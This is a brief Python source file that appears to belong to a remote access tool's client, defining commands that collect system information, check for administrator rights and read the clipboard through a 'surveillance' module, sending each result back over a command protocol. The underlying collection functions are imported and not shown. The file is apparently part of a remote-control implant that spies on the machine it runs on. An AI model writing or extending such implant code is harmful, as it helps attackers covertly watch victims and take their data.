from client.commands.base import Command
from client.modules.sysinfo import get_sysinfo


class SysinfoCommand(Command):
    name = 'sysinfo'

    def execute(self, ctx, raw: str):
        result = get_sysinfo(ctx.platform)
        ctx.protocol.send(result)
        return True


class CheckAdminCommand(Command):
    name = 'check_admin'

    def execute(self, ctx, raw: str):
        result = ctx.platform.check_admin()
        ctx.protocol.send(result)
        return True


class ClipboardCommand(Command):
    name = 'clipboard'

    def execute(self, ctx, raw: str):
        from client.modules.surveillance.clipboard import get_clipboard
        ctx.protocol.send(get_clipboard())
        return True
